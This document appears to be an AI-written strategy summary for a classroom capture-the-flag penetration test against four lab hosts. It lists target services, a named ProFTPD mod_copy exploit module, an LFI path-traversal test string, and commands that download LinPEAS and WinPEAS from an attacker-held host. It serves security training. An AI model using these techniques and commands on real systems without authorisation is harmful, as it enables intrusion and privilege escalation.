# CTF Penetration Testing - Complete Summary

## 🎯 Mission Overview

**Objective:** Capture 12 flags (3 per system) across 4 target systems in the 10.12.0.0/24 network  
**Current Progress:** 1/12 flags found (8.33%)  
**Date:** November 8-9, 2025

---

## 📊 Target Systems Overview

| IP | OS | Key Services | Flags Found |
|----|----|--------------| ------------|
| 10.12.0.42 | Linux/Ubuntu | ProFTPD 1.3.5, nginx, SSH | 0/3 |
| 10.12.0.111 | Windows | IIS 10.0, SMB, WinRM | 0/3 |
| 10.12.0.136 | Windows | Legacy services, RDP | 1/3 ✅ |
| 10.12.0.194 | Linux/Ubuntu | Apache 2.4.29, SSH | 0/3 |

---

## ✅ Flag Captured

### 10.12.0.136 - Flag 1: CSEC-3961-QOTD

**Service:** QOTD (Quote of the Day) on port 17/tcp  
**Method:** Simple banner grab / service interaction  
**Command:** `nc 10.12.0.136 17`

**Hint Provided by Flag:**
> "This looks like a new, fully patched system. Maybe there is a vulnerable, 3rd party service installed instead."

**Implications:**
- System is fully patched (not vulnerable to standard Windows exploits)
- Must look for vulnerable 3rd-party applications
- Flags 2 and 3 likely require finding and exploiting this 3rd-party service

---

## 🎯 High-Priority Targets for Quick Wins

### 1. 10.12.0.42 - ProFTPD Vulnerability (HIGHEST PRIORITY)
**Why:** ProFTPD 1.3.5 has known exploits
**CVE:** CVE-2015-3306 (mod_copy unauthenticated file copy)
**Attack Vector:**
- Exploit allows copying any file to web-accessible directory
- Can exfiltrate /etc/passwd, SSH keys, flag files
- Can potentially get RCE by copying PHP shells to webroot

**Action Items:**
1. Test anonymous FTP access first (easiest)
2. Use Metasploit module: `exploit/unix/ftp/proftpd_modcopy_exec`
3. Enumerate web directories with gobuster
4. Look for flag.txt in FTP or web directories

**Estimated Time to Flag 1:** 10-15 minutes

---

### 2. 10.12.0.194 - Apache Web Server (HIGH PRIORITY)
**Why:** Web servers often have the most vulnerabilities
**Attack Vector:**
- Directory enumeration for hidden files/folders
- Web application vulnerabilities (LFI, SQLi, RCE)
- Misconfigured permissions

**Action Items:**
1. Run gobuster for directory enumeration
2. Check for flag.txt, robots.txt, common files
3. Test for LFI: `?page=../../../../etc/passwd`
4. Test for command injection if any input forms exist
5. Look for .git directory exposure

**Estimated Time to Flag 1:** 15-20 minutes

---

### 3. 10.12.0.111 - IIS Web Server & SMB (MEDIUM PRIORITY)
**Why:** Two web servers + SMB gives multiple attack vectors
**Attack Vector:**
- IIS misconfigurations
- Accessible SMB shares
- Web application vulnerabilities on ports 80 and 8080

**Action Items:**
1. Enumerate both web servers (ports 80 and 8080)
2. Check for null session SMB access
3. Run enum4linux for comprehensive enumeration
4. Test WebDAV if enabled
5. Look for file upload functionality

**Estimated Time to Flag 1:** 20-30 minutes

---

### 4. 10.12.0.136 - Third-Party Service Discovery (MEDIUM PRIORITY)
**Why:** Flag 1 already obtained, but hints at vulnerable service
**Attack Vector:**
- Must find the "vulnerable 3rd-party service" mentioned in hint
- Full port scan to discover non-standard services

**Action Items:**
1. ✅ Flag 1 already captured
2. Run full port scan: `nmap -p- 10.12.0.136`
3. Check for VNC, TeamViewer, or other remote access tools
4. Enumerate via RPC for installed software
5. Test all discovered services for vulnerabilities

**Estimated Time to Flag 2:** 30-45 minutes (after discovering service)

---

## 📋 Comprehensive Resource Files Created

I've created the following files to guide your penetration testing:

### 1. **PenetrationTestingReport.md** (MAIN REPORT)
**Contents:**
- Detailed analysis of each target system
- Vulnerability assessments
- Recommended actions for each system
- Flag tracking table
- Tools needed

**Use this for:** Overall strategy and understanding each target

---

### 2. **exploitation_strategies.md** (EXPLOITATION GUIDE)
**Contents:**
- Specific exploitation paths for each system
- Detailed command examples
- Multiple attack vectors per system
- Privilege escalation strategies
- Expected flag locations

**Use this for:** Step-by-step exploitation instructions

---

### 3. **enumeration_commands.sh** (AUTOMATION SCRIPT)
**Contents:**
- Automated enumeration for all 4 targets
- Runs gobuster, nikto, FTP tests, SMB enumeration
- Creates organized output directory
- Parallel execution for efficiency

**Use this for:** Quick initial enumeration of all targets

**Run with:**
```bash
chmod +x enumeration_commands.sh
./enumeration_commands.sh
```

---

### 4. **quick_reference_commands.md** (CHEAT SHEET)
**Contents:**
- Common pentesting commands
- Reverse shell payloads
- File transfer methods
- Privilege escalation checklists
- Default credentials
- Port number reference

**Use this for:** Quick lookup of commands and techniques

---

### 5. **NEXT_STEPS.md** (ACTION PLAN)
**Contents:**
- Phased approach to the CTF
- Target-specific quick wins
- Troubleshooting tips
- Success metrics

**Use this for:** Immediate next actions and troubleshooting

---

## 🚀 Recommended Execution Order

### Phase 1: Automated Enumeration (5-10 minutes)
```bash
cd /workspace
./enumeration_commands.sh
```
Let this run in the background while you proceed to Phase 2.

---

### Phase 2: Manual Web Inspection (10 minutes)
Open each web server in a browser and inspect:
```bash
firefox http://10.12.0.42 &
firefox http://10.12.0.111 &
firefox http://10.12.0.111:8080 &
firefox http://10.12.0.194 &
```

Look for:
- Login forms
- File upload functionality
- Error messages
- Version information
- Any flags in plain sight

---

### Phase 3: Review Enumeration Results (10 minutes)
```bash
cd ~/pentest_results_$(date +%Y%m%d)
ls -la

# Check gobuster results
cat gobuster_*.txt | grep "Status: 200"

# Review interesting findings
less nikto_10.12.0.42.txt
less smb_shares_10.12.0.111.txt
```

---

### Phase 4: Target Exploitation (1-2 hours)
Based on enumeration, exploit in this order:

1. **10.12.0.42 (ProFTPD)**
   - Test anonymous FTP
   - Try ProFTPD mod_copy exploit
   - Check discovered web directories

2. **10.12.0.194 (Apache)**
   - Test discovered web directories
   - Try LFI/RFI attacks
   - Check for web app vulnerabilities

3. **10.12.0.111 (IIS/SMB)**
   - Access discovered SMB shares
   - Test web applications on both ports
   - Look for upload functionality

4. **10.12.0.136 (3rd Party Service)**
   - Run full port scan
   - Identify the 3rd party service
   - Research and exploit

---

### Phase 5: Shell Access & Privilege Escalation (2-3 hours)
Once you have initial access to systems:

**Linux (10.12.0.42, 10.12.0.194):**
```bash
# Upload LinPEAS
wget http://YOUR_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Look for:
# - SUID binaries
# - Sudo misconfigurations
# - Cron jobs
# - Kernel exploits
```

**Windows (10.12.0.111, 10.12.0.136):**
```powershell
# Upload WinPEAS
certutil -urlcache -f http://YOUR_IP/winPEAS.exe winPEAS.exe
.\winPEAS.exe

# Look for:
# - Unquoted service paths
# - AlwaysInstallElevated
# - Stored credentials
# - Token impersonation opportunities
```

---

## 🎓 Key Concepts to Remember

### Flag Distribution Pattern (General)
- **Flag 1 (Enumeration):** Accessible through scanning and basic service interaction
- **Flag 2 (User Access):** Requires low-privilege shell access to the system
- **Flag 3 (Admin/Root):** Requires privilege escalation to administrator or root

### One Exploit Per Flag Rule ⚠️
- Each exploit technique can only be used ONCE across all 12 flags
- Using the same exploit for multiple flags = no points for duplicates
- Example: If you use MS17-010 for one flag, you cannot use it again
- Plan your exploits carefully!

### Alternative Methods = Bonus Points 🌟
- Finding different ways to get the same flag earns bonus points
- Must be genuinely different technique (not just different tool)
- Example: Getting admin via different exploits counts as different methods

---

## 📝 Documentation Tips

Keep detailed notes including:
1. **Timestamp** of each action
2. **Commands executed** and their output
3. **Flags found** and the method used
4. **Failed attempts** and why they didn't work
5. **Screenshots** of key moments

This helps with:
- Reporting requirements
- Learning from mistakes
- Asking for hints (instructor needs to know what you've tried)

---

## 🆘 When to Ask for Help

Request a hint if:
- Stuck on one flag for more than 1 hour
- Completed all enumeration with no leads
- Made a mistake and locked yourself out
- Need clarification on rules

**What to provide when asking:**
- Target system IP
- Which flag (1, 2, or 3)
- Commands you've tried
- Enumeration results
- Any error messages

---

## 🎯 Success Milestones

- [ ] **4 flags (33%)** - Understanding the environment
- [ ] **6 flags (50%)** - Gaining momentum
- [ ] **9 flags (75%)** - Advanced exploitation skills
- [ ] **12 flags (100%)** - Complete mastery 🏆

---

## 🛠️ Required Tools Checklist

Make sure these are installed on your Kali box:

- [x] nmap (used for initial scan)
- [ ] gobuster or dirb
- [ ] nikto
- [ ] smbclient / enum4linux
- [ ] ftp client
- [ ] netcat (nc)
- [ ] searchsploit / metasploit
- [ ] hydra (if needed for password attacks)
- [ ] burp suite (for web app testing)
- [ ] curl / wget

**Install missing tools:**
```bash
sudo apt update
sudo apt install -y gobuster nikto smbclient ftp netcat-traditional \
                    exploitdb metasploit-framework hydra burpsuite
```

---

## 🌟 Pro Tips

1. **Start Simple:** Always check for flag.txt in obvious locations first
2. **Read Hints Carefully:** The QOTD flag gave a crucial hint about 10.12.0.136
3. **Enumerate Thoroughly:** Spend 30-40% of time on enumeration, it pays off
4. **Take Breaks:** If stuck, work on a different system and come back later
5. **Google Everything:** Service versions, error messages, strange behaviors
6. **Test Input Fields:** Any form input could be vulnerable to injection
7. **Check Source Code:** Web page source often reveals hidden comments or paths
8. **Follow the Clues:** Flags often contain hints for the next stage

---

## 📈 Estimated Time to Completion

**Conservative Estimate:** 6-8 hours
**Aggressive Estimate:** 4-6 hours
**Realistic Timeline:**
- Flags 1-4: 2-3 hours (enumeration phase)
- Flags 5-8: 2-3 hours (initial access phase)
- Flags 9-12: 2-3 hours (privilege escalation phase)

---

## 🎊 Final Motivation

You've already found 1 flag just from the nmap scan - that's great reconnaissance! 

The tools and guides I've created give you a solid roadmap. The next few flags should come relatively quickly as you enumerate the web servers and test for easy wins like anonymous FTP access and vulnerable services.

**You've got this!** Work systematically, document everything, and don't hesitate to ask for hints when genuinely stuck.

Good hunting! 🎯🔥

---

## 📞 Quick Reference

| Document | Purpose |
|----------|---------|
| **NEXT_STEPS.md** | Start here for immediate actions |
| **PenetrationTestingReport.md** | Detailed target analysis |
| **exploitation_strategies.md** | Step-by-step exploitation guides |
| **quick_reference_commands.md** | Command cheat sheet |
| **enumeration_commands.sh** | Automated enumeration script |
| **CTF_SUMMARY.md** | This file - overall strategy |

**Main Repository:** /workspace/  
**Your Kali Box:** Connected to 10.12.0.0/24 network  
**Start Command:** `./enumeration_commands.sh`

---

*Last Updated: 2025-11-09*  
*Flags Captured: 1/12*  
*Status: Ready for Phase 2 enumeration*
